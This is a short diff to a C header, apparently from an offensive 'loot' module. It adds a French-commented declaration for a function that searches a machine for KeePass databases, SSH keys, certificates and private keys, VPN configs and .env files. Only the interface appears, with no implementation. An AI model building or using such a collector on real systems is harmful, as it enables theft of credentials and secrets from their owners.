@@ -77,4 +77,20 @@ int loot_grab(const char *filepath, char *output, size_t size);
  */
 int loot_browser(char *output, size_t size);
 
+/**
+ * Recherche de fichiers sensibles connus
+ *
+ * Cible spécifiquement :
+ * - KeePass databases (.kdbx, .kdb)
+ * - Clés SSH (id_rsa, id_ed25519, id_ecdsa, *.ppk)
+ * - Certificats et clés privées (.pem, .pfx, .p12)
+ * - Configs VPN (.ovpn)
+ * - Fichiers d'environnement et de config (.env, web.config, ...)
+ *
+ * @param output Buffer pour stocker les chemins trouvés
+ * @param size Taille du buffer
+ * @return LOOT_SUCCESS ou code d'erreur
+ */
+int loot_sensitive(char *output, size_t size);
+
 #endif // LOOT_H
